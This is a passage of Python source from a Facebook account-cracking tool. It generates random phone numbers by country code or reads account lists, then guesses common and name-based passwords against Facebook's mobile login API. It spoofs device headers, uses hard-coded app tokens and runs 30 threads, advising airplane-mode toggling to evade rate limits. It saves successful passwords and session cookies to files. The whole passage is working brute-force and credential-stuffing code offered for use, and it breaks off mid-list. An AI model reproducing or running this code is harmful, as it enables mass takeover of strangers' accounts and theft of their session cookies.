            if mthd =='2':
                sexy.submit(randm1,ids,psd)
            if mthd =='3':
                sexy.submit(randm2,ids,psd)
            if mthd =='4':
                sexy.submit(randm3,ids,psd)
    print('')
    print(f'\r{G}──────────────────────────────────────────────────')
    print(f'\033[1;32m[\033[1;31m✓\033[1;32m] THE PROCESS HAS BEEN COMPLETED')
    print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL OK ID {G}:{G2} {str(len(ok))}')
    print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL CP ID {G}:{G3} {str(len(cp))}')
    print(f'\r{G}──────────────────────────────────────────────────')
    input(f'\033[1;32m[\033[1;31m✓\033[1;32m] PRESS ENTER TO BACK ')
    menu()
    
#__________________[ AFGHANISTAN ]__________________#        

def _Afg_():
    clear()
    print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE {G}:{G1} +9330{G}/{G1}+9340{G}/{G1}+9350{G}/{G1}+9360 ');linex()
    code = input(f'\033[1;32m[\033[1;31m✓\033[1;32m] CHOICE  {G}:{G2} ')
    clear()
    print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE {G}:{G3} 3000{G}/{G3}5000{G}/{G3}10000{G}/{G3}99999');linex()
    limit = int(input(f'\033[1;32m[\033[1;31m✓\033[1;32m] CHOICE  {G}:{G4} '))
    clear()
    print(f'\033[1;32m[\033[1;31m1\033[1;32m] METHOD \033[1;32m[\033[1;31mM1\033[1;32m] \n\033[1;32m[\033[1;31m2\033[1;32m] METHOD \033[1;32m[\033[1;31mM2\033[1;32m] \n\033[1;32m[\033[1;31m3\033[1;32m] METHOD \033[1;32m[\033[1;31mM3\033[1;32m] \n\033[1;32m[\033[1;31m4\033[1;32m] METHOD \033[1;32m[\033[1;31mM4\033[1;32m] ');linex()
    mthd = input(f'\033[1;32m[\033[1;31m✓\033[1;32m] CHOICE  : ')
    for x in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    clear()
    with Habib(max_workers=30) as sexy:
        clear()
        print(f'\033[1;32m[\033[1;31m✓\033[1;32m] SIM CODE  {G}:{G1} {code}')
        print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL UID {G}:{G2} {str(len(user))}')
        print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TURN {G3}[{R}ON{G}/{R}OFF{G3}]{G3} AIRPLANE MODE EVERY {R}5{G3} MIN');linex()
        for love in user:
            ids = code+love
            psd = [love,ids,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','Û±Û³Û³Û³ÛµÛ¶Û·Û¸Û¹','Û±Û³Û³Û³ÛµÛ¶','afghan1234','kabul1234','khankhan','khan123','khan123456','khan786']
            if mthd =='1':
            	sexy.submit(randm,ids,psd)
            if mthd =='2':
                sexy.submit(randm1,ids,psd)
            if mthd =='3':
                sexy.submit(randm2,ids,psd)
            if mthd =='4':
                sexy.submit(randm3,ids,psd)
    print('')
    print(f'\r{G}──────────────────────────────────────────────────')
    print(f'\033[1;32m[\033[1;31m✓\033[1;32m] THE PROCESS HAS BEEN COMPLETED')
    print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL OK ID {G}:{G2} {str(len(ok))}')
    print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL CP ID {G}:{G3} {str(len(cp))}')
    print(f'\r{G}──────────────────────────────────────────────────')
    input(f'\033[1;32m[\033[1;31m✓\033[1;32m] PRESS ENTER TO BACK ')
    menu()
    
    
#__________________[ FILE ]__________________#      
def _file_():
    global methods
    clear()
    print(f'\033[1;32m[\033[1;31m1\033[1;32m] METHOD {G1}[{G}M1{G1}]{G1} ')
    print(f'\033[1;32m[\033[1;31m2\033[1;32m] METHOD {G2}[{G}M2{G2}]{G1} ')
    print(f'\033[1;32m[\033[1;31m3\033[1;32m] METHOD {G2}[{G}M3{G2}]{G1} ')
    linex()
    option = input(f'\033[1;32m[\033[1;31m✓\033[1;32m] CHOICE {G}:{G3} ')
    if option =='1':
        methods.append('methodA')
        main_crack().crack(id)
    elif option =='2':
        methods.append('methodB')
        main_crack().crack(id)
    elif option =='3':
        methods.append('methodC')
        main_crack().crack(id)
    elif option =='0':
        _file_()
    else:
      print(f'\033[1;32m[\033[1;31m✓\033[1;32m] VALID OPTION')
      time.sleep(2)
      _file_()

class main_crack():
    def __init__(self):
        self.id=[]
    def crack(self,id):
        global methods
        clear()
        print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE {G}:{G1} /sdcard/ARNAV.txt');linex()
        self.file = input(f'\033[1;32m[\033[1;31m✓\033[1;32m] FILE NAME {G}:{G2} ')
        try:
            self.id = open(self.file).read().splitlines()
            self.pasw()
        except FileNotFoundError:
            print(f'\033[1;32m[\033[1;31m✓\033[1;32m] OPPS FILE NOT FOUND ...')
            time.sleep(2)
            os.system('clear')
            print(logo)
            print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TRY AGAIN ...')
            time.sleep(2)
            main_crack().crack(id)
#__________________[ FILE METHOD M1 ]__________________#           
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r{G1}[{R}ARNAV-M1{G1}] [{Y}{loop}{G1}]{A} {G1}{A}OK{G1}/{R}CP{G1} {A}{len(oks)}{G1}/{R}{len(cps)}{G1} ")
            ua = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/72.0.0.1138;FBBV/6304476;[FBAN/Orca-Android;FBAV/424.0.0.25.113;FBPN/com.facebook.orca;FBLC/en_US;FBBV/510343531;FBCR/Verizon ;FBMF/motorola;FBBD/motorola;FBDV/moto g play - 2023;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.75,width=720,height=1439};FB_FW/1;]'
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                with requests.Session() as session:
                    data = {'adid':str(uuid.uuid4()),
'email':sid,
'password':ps,
'cpl':'true',
'credentials_type':'device_based_login_password',
"source": "device_based_login",
'error_detail_type':'button_with_disabled',
'format':'json',
'generate_session_cookies':'1',
'generate_analytics_claim':'1',
'generate_machine_id':'1',
"family_device_id": str(uuid.uuid4()),
"advertiser_id": str(uuid.uuid4()),
"locale":"US_MX","client_country_code":"US",
"device_id": str(uuid.uuid4()),
"method": "auth.login",
"api_key": "882a8490361da98702bf97a021ddc14d",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}

                headers = {'content-type':'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'x-fb-sim-hni':str(random.randint(2e4,4e4)),
'X-FB-Connection-Type': 'MOBILE.LTE',
'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
'user-agent':ua,
'x-fb-net-hni':str(random.randint(2e4,4e4)),
'x-fb-device-group': '5120',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
'x-fb-connection-quality':'EXCELLENT',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
'x-fb-friendly-name':'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'accept-encoding':'gzip, deflate',
'x-fb-http-engine':     'Liger'}
                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);BIKKIb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={BIKKIb};{ckkk}"
                    print(f"\r\r{G1}[ARNAV-OK] {sid} | {ps} ")
                    print(f'\r\r{G1}|🍪|{R} {cookie}')
                    open('/sdcard/ARNAV-M1-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     print(f"\r\r{M}[ARNAV-CP] {sid} | {ps} ")
                     open('/sdcard/ARNAV-M2-FILE-OK.txt','a').write(sid+'|'+ps+'\n')
                     cps.append(sid)
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.methodA(sid, name, ps)
#__________________[ FILE METHOD M2 ]__________________#             
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            fileua22 = random.choice(filenm)
            sys.stdout.write(f"\r{G1}[{R}ARNAV-M2{G1}] [{Y}{loop}{G1}]{A} {G1}{A}OK{G1}/{R}CP{G1} {A}{len(oks)}{G1}/{R}{len(cps)}{G1} ")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "register_api",
"email": sid,
"password": ps,
"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "NO_FILE",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_PK",
"client_country_code": "PK",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': file2(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': f'{SEX}',
'Authorization':'OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895',
'X-FB-Connection-Quality':f'{SEX}',
"X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);BIKKIb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={BIKKIb};{ckkk}"
                    print(f"\r\r{G1}[ARNAV-OK] {sid} | {ps} ")
                    print(f'\r\r{G1}|🍪|{R} {cookie}')
                    open('/sdcard/ARNAV-M2-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r\r{M}[ARNAV-CP] {sid} | {ps} ")
                    open('/sdcard/ARNAV-M2-FILE-OK.txt','a').write(sid+'|'+ps+'\n')
                    cps.append(sid)
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.methodB(sid, name, ps)
            
#__________________[ FILE METHOD M3 ]__________________#             
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            fileua22 = random.choice(filenm)
            sys.stdout.write(f"\r{G1}[{R}ARNAV-M3{G1}] [{Y}{loop}{G1}]{A} {G1}{A}OK{G1}/{R}CP{G1} {A}{len(oks)}{G1}/{R}{len(cps)}{G1} ")
            uaxx = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/72.0.0.1138;FBBV/6304476;[FBAN/Orca-Android;FBAV/424.0.0.25.113;FBPN/com.facebook.orca;FBLC/en_US;FBBV/510343531;FBCR/Verizon ;FBMF/motorola;FBBD/motorola;FBDV/moto g play - 2023;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.75,width=720,height=1439};FB_FW/1;]'
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"secure_family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "account_recovery",
'sim_serials': "['80973453345210784798']",
'openid_flow': 'android_login',
'openid_provider': 'google',
"email": sid,
"password": ps,
"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "V2_UNTAGGED",
'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_US",
"client_country_code": "US",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "AuthOperations$PasswordAuthOperation",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                content_lenght = ("&").join([ "%s=%s" % (key, value) for key, value in data.items() ])
                headers = {'User-Agent':uaxx,
'Content-Type': 'application/x-www-form-urlencoded',
'x-fb-Connection-Type': 'MOBILE.LTE',
'Accept': '*/*',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(2e4, 4e4)),
'X-FB-SIM-HNI': str(random.randint(2e4, 4e4)),
'X-Fb-Connection-Bandwidth': str(random.randint(20000000, 30000000)),
'Priority' : 'u=3,i',
'Zero-Rated': '0',
'X-Fb-Connection-Quality': 'GOOD',
'X-FB-Friendly-Name': 'authenticate',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'X-Fb-Device-Group': '5120',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
'Content-Length': str(len(content_lenght))}
                q = session.post("https://b-api.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);BIKKIb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={BIKKIb};{ckkk}"
                    print(f"\r\r{G1}[ARNAV-OK] {sid} | {ps} ")
                    print(f'\r\r{G1}|🍪|{R} {cookie}')
                    open('/sdcard/ARNAV-M2-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r\r{M}[ARNAV-CP] {sid} | {ps} ")
                    open('/sdcard/ARNAV-M3-FILE-OK.txt','a').write(sid+'|'+ps+'\n')
                    cps.append(sid)
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.methodC(sid, name, ps)
            
#__________________[ PASSWORD ]__________________#
    def pasw(self):       
            pw = []
            clear()
            print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE {G}:{G2} BD 10-18/INDIA 3-5');linex()
            sl = int(input(f'\033[1;32m[\033[1;31m✓\033[1;32m] PASSWORD LIMIT {G}:{G3} '))
            clear()
            print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE {G}:{G4} first123/firstlast/first@@@')
            linex()
            if sl =='':
                print(f'\033[1;32m[\033[1;31m✓\033[1;32m] PUT LIMIT BETWEEN 1 TO 30')
            elif sl > 20:
                print(f'\033[1;32m[\033[1;31m✓\033[1;32m] PASSWORD LIMIT SHOULD NOT BE GREATER THAN 30')
            else:
                for sr in range(sl):
                    pw.append(input(f'\033[1;32m[\033[1;31m✓\033[1;32m] PASSWORD NO {G1}[{G}{sr+1}{G1}] {G}:{G1} '))
            clear()
            print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL FILE UID {G}:{G1} %s ' % len(self.id))
            print(f'\033[1;32m[\033[1;31m✓\033[1;32m] PASSWORD LIMIT {G}:{G1} {sl} ')
            print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TURN {G3}[{R}ON{G}/{R}OFF{G3}]{G3} AIRPLANE MODE EVERY {R}5{G3} MIN')
            linex()
            with Habib(max_workers=30) as BIKKIworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                       else:
                            pwx =  pw
                            if 'methodA' in methods:
                                BIKKIworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                BIKKIworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                BIKKIworld.submit(self.methodC, uid, name, pwx)
                   except:pass
            result(oks,cps)
           
#__________________[ RANDOM METHOD1 ]__________________#
def randm(ids,psd):
    global loop,ok,cp
    hehehe = random.choice(voda)
    sys.stdout.write(f"\r\033[1;32m[\033[1;31mRANDOM-M1\033[1;32m] \033[1;35m{loop}\033[1;35m \033[1;32m|\033[1;32m OK{G}/{R}CP \033[1;32m|\033[1;32m {G}{len(ok)}/{R}{len(cp)} ")
    rando= '[FBAN/FB4A;FBAV/'+str(random.randint(111,999))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/'+str(random.randint(50,200))+'.0.0.'+str(random.randint(11,49))+'.120;FBBV/'+str(random.randint(111111111,999999999))+';FBDM/{density=2'+'.0,width='+'720,height='+'1440};FBLC/en_US;FBRV/'+str(random.randint(111111111,999999999))+';FBCR/Zong;FBMF/nokia;FBBD/nokia;FBPN/com.facebook.katana;FBDV/TA-'+str(random.randint(1000,1500))+';FBSV/'+str(random.randint(4,13))+'.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
    sys.stdout.flush()
    try:
        for pas in psd:
            data={'email': ids, 
'password': pas, 
'adid': str(uuid.uuid4()),
'device_id': str(uuid.uuid4()),
'family_device_id': str(uuid.uuid4()),
'session_id': str(uuid.uuid4()),
'advertiser_id': str(uuid.uuid4()),
'reg_instance': str(uuid.uuid4()),
'logged_out_id': str(uuid.uuid4()),
'locale': 'en_US', 
'client_country_code': 'US', 
'cpl': 'true', 'source': 'login',
'format': 'json', 
'omit_response_on_success': 'false', 
'credentials_type': 'password',
'error_detail_type': 'button_with_disabled',
'generate_session_cookies': '1',
'generate_analytics_claim': '1',
'generate_machine_id': '1',
'tier': 'regular',
'currently_logged_in_userid': '0',
'fb_api_req_friendly_name': 'authenticate', 
'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
'fb4a_shared_phone_cpl_experiment': 'fb4a_shared_phone_nonce_cpl_at_risk_v3', 
'fb4a_shared_phone_cpl_group': 'enable_v3_at_risk', 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
'api_key': '882a8490361da98702bf97a021ddc14d',
'sig': '62f8ce9f74b12f84c123cc23437a4a32'}
            content_lenght = ("&").join([ "%s=%s" % (key, value) for key, value in data.items() ])
            head={'User-Agent': rando,
'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Bandwidth': str(random.randint(20000000, 30000000)),
'X-FB-Connection-Quality': 'EXCELLENT',
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Friendly-Name': 'authenticate',
'Content-Type': 'application/x-www-form-urlencoded', 
'Content-Length': str(len(content_lenght))}
            url = 'https://b-graph.facebook.com/auth/login'
            po = requests.post(url,data=data,headers=head,allow_redirects=False).text
            q = json.loads(po)
            if 'access_token' in q:
                uid = str(q['uid'])
                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);BIKKIb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={BIKKIb};{ckkk}"
                print(f'\r\r{G1}[ARNAV-OK] {uid} | {pas}')
                print(f'\r\r{G1}|🍪|{R} {cookie}')
                open('/sdcard/ARNAV-RUNNING-OK.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
                ok.append(uid)
                break
            else:continue
        loop+=1
    except Exception as e:
        pass
        
        
#__________________[ RANDOM METHOD2 ]__________________#     
def randm1(ids,psd):
    global loop,ok,cp
    sys.stdout.write(f"\r\033[1;32m[\033[1;31mRANDOM-M2\033[1;32m] \033[1;35m{loop}\033[1;35m \033[1;32m|\033[1;32m OK{G}/{R}CP \033[1;32m|\033[1;32m {G}{len(ok)}/{R}{len(cp)} ")
    sys.stdout.flush()
    try:
        for pas in psd:
            data={'adid': str(uuid.uuid4()),
'format': 'json',
'device_id': str(uuid.uuid4()),
'email': ids,
'password': pas,
'generate_analytics_claims': '1',
'community_id': '',
'cpl': 'true',
'try_num': '1',
'family_device_id': str(uuid.uuid4()),
'credentials_type': 'password',
'source': 'login',
'error_detail_type': 'button_with_disabled',
'enroll_misauth': 'false',
'generate_session_cookies': '1',
'generate_machine_id': '1',
'currently_logged_in_userid': '0',
'locale': 'en_GB',
'client_country_code': 'GB',
'fb_api_req_friendly_name': 'authenticate'}
            head={'User-Agent': random2(),
'Accept-Encoding':  'gzip, deflate',
'Accept': '*/*',
'Connection': 'keep-alive',
'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
'X-FB-Friendly-Name': 'authenticate',
'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': 'unknown',
'Content-Type': 'application/x-www-form-urlencoded',
'X-FB-HTTP-Engine': 'Liger'}
            url = 'https://b-graph.facebook.com/auth/login'
            po = requests.post(url,data=data,headers=head,allow_redirects=False).text
            q = json.loads(po)
            if 'access_token' in q:
                uid = str(q['uid'])
                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);BIKKIb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={BIKKIb};{ckkk}"
                print(f'\r\r{G1}[ARNAV-OK] {uid} | {pas}')
                print(f'\r\r{G1}|🍪|{R} {cookie}')
                open('/sdcard/ARNAV-RUNNING-OK.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
                ok.append(uid)
                break
            else:continue
        loop+=1
    except Exception as e:
        pass
    
#__________________[ RANDOM METHOD3 ]__________________#    
def randm2(ids,psd):
    global loop,ok,cp
    uav = random.choice(videop)
    sys.stdout.write(f"\r\033[1;32m[\033[1;31mRANDOM-M3\033[1;32m] \033[1;35m{loop}\033[1;35m \033[1;32m|\033[1;32m OK{G}/{R}CP \033[1;32m|\033[1;32m {G}{len(ok)}/{R}{len(cp)} ")
    sys.stdout.flush()
    try:
        for pas in psd:
            data={'adid':str(uuid.uuid4()),
            'format':'json',
            'device_id':str(uuid.uuid4()),
            'email':ids,
            'password':pas,
            'generate_analytics_claims':'1',
            'community_id':'',
            'cpl':'true','try_num':'1',
            'family_device_id':str(uuid.uuid4()),
            'credentials_type':'password',
            'source':'login',
            'error_detail_type':'button_with_disabled',
            'enroll_misauth':'false',
            'generate_session_cookies':'1',
            'generate_machine_id':'1',
            'currently_logged_in_userid':'0',
            'locale':'en_US',
            'client_country_code':'US',
            'fb_api_req_friendly_name':'authenticate',
            "fb_api_caller_class": "AuthOperations$PasswordAuthOperation",
            'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
            'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            head={'User-Agent': random3(),
            'Accept-Encoding':'gzip, deflate',
            'Connection':'close',
            'Content-Type':'application/x-www-form-urlencoded',
            'Host':'graph.facebook.com',
            'X-FB-Net-HNI':str(random.randint(2e4, 4e4)),
            'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),
            'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'X-FB-Connection-Type':'WIFI',
            'X-Tigon-Is-Retry':'False',
            'x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
            'x-fb-device-group':'5120',
            'X-FB-Friendly-Name':'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags':'graphservice',
            'X-FB-HTTP-Engine':'Liger',
            'X-FB-Client-IP':'True',
            'X-FB-Server-Cluster':'True',
            'x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
            url = 'https://b-graph.facebook.com/auth/login'
            po = requests.post(url,data=data,headers=head,allow_redirects=False).text
            q = json.loads(po)
            if 'access_token' in q:
                uid = str(q['uid'])
                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);BIKKIb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={BIKKIb};{ckkk}"
                print(f'\r\r{G1}[ARNAV-OK] {uid} | {pas}')
                print(f'\r\r{G1}|🍪|{R} {cookie}')
                open('/sdcard/ARNAV-RUNNING-OK.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
                ok.append(uid)
                break
            else:continue
        loop+=1
    except Exception as e:
        pass
   
AMSS2 = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   